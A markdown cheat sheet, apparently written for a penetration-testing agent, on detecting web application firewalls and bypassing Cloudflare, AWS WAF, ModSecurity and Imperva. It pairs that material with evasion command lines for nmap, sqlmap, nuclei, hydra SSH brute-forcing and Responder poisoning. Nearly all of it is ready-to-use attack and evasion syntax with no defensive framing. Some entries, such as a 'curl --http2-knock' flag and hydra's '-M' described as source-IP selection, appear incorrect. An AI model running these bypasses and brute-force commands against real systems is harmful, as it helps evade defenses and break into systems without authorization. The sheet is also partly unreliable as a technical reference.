# WAF Detection & Bypass Reference

## WAF Detection

### wafw00f Usage
```bash
wafw00f_scan(target="http://example.com")
```
Returns: WAF vendor, detection method, confidence level.

### Manual Detection Signs
| Indicator | WAF Present |
|---|---|
| 403/406 on attack payloads | Likely WAF |
| "Access Denied" generic page | Likely WAF |
| Rate limiting on scans | Likely WAF |
| Connection drops on nuclei | Likely WAF |
| Response time increases | Likely WAF |

## Bypass Techniques by WAF

### Cloudflare
| Technique | Example |
|---|---|
| Origin IP discovery | `shodan query:"http.title:example.com" -org` |
| Censys IP lookup | `censys search:services.tls.certificates.leaf_names:example.com` |
| Direct IP access | `curl -H "Host: example.com" https://ORIGIN_IP/` |
| IPv6 bypass | Try AAAA records |
| HTTP/2 smuggling | `curl --http2-knock` |
| Subdomain discovery | `subdomain_enum` for origin subdomains |

### AWS WAF
| Technique | Example |
|---|---|
| Chunked encoding | Transfer-Encoding: chunked |
| HTTP parameter pollution | `?id=1&id=2` |
| Unicode normalization | `/%C0%AF` instead of `/` |
| Case variation | `SeLeCt` instead of `SELECT` |
| Comment insertion | `SEL/**/ECT` |

### ModSecurity
| Technique | Example |
|---|---|
| Null bytes | `%00` in payloads |
| URL encoding double | `%%37%31` |
| Unicode normalization | `&#x0053;&#x0065;&#x006C;&#x0065;&#x0063;&#x0074;` |
| HTTP/1.0 | `GET / HTTP/1.0` (some WAFs ignore 1.0) |
| Case variation | `uNiOn SeLeCt` |

### Imperva
| Technique | Example |
|---|---|
| Slow POST | Slowloris-style slow body |
| Chunked transfer | `Transfer-Encoding: chunked` |
| Tab/newline in payload | `SEL\tECT` |
| Double encoding | `%2527` |
| Case variation | Mixed case keywords |

### Generic WAF Bypass
| Technique | Description |
|---|---|
| Fragmentation | Split payload across multiple requests |
| Timeout manipulation | Slow requests to bypass timing detection |
| Source port | Use port 53, 88, or other allowed ports |
| Decoy scans | `nmap -D RND:10` |
| IP spoofing | If on same network segment |
| Protocol manipulation | IP options, fragmented headers |

## Nmap Evasion Flags

```bash
# Fragmentation
nmap -f -T2 target

# Custom MTU
nmap --mtu 24 target

# Decoy scans
nmap -D RND:10 target

# Source port manipulation
nmap --source-port 53 target

# Idle scan
nmap -sI zombie_host:port target

# Append random data
nmap --data-length 25 target

# Spoof MAC
nmap --spoof-mac 0 target

# Bad checksums
nmap --badsum target
```

## SQLMap Evasion

```bash
# Tamper scripts
sqlmap -u "http://target/?id=1" --tamper=space2comment,between,randomcase
sqlmap -u "http://target/?id=1" --tamper=charencode,randomcase
sqlmap -u "http://target/?id=1" --tamper=between,space2comment --random-agent

# Level and risk adjustment
sqlmap -u "http://target/?id=1" --level=5 --risk=3

# Custom injection point
sqlmap -u "http://target/" --data="id=1*" --method=POST

# Skip static parameters
sqlmap -u "http://target/?id=1&static=skip" --skip-static
```

## Nuclei Evasion

```bash
# Rate limiting
nuclei -u target -rate-limit 100

# Specific templates only
nuclei -u target -tags cves -severity critical,high

# Proxy through Burp
nuclei -u target -proxy http://127.0.0.1:8080

# Custom headers
nuclei -u target -H "X-Forwarded-For: 127.0.0.1"
```

## Hydra Evasion

```bash
# Rate limiting to avoid lockout
hydra -l admin -P wordlist.txt target ssh -t 4 -W 5

# Use specific source IP
hydra -l admin -P wordlist.txt target ssh -M sources.txt
```

## Responder Evasion

```bash
# Analyze only (don't poison)
responder -I eth0 -A

# Specific protocols only
responder -I eth0 --lm -n -w

# Feeding to cracked hashes
responder -I eth0 -wrf
```
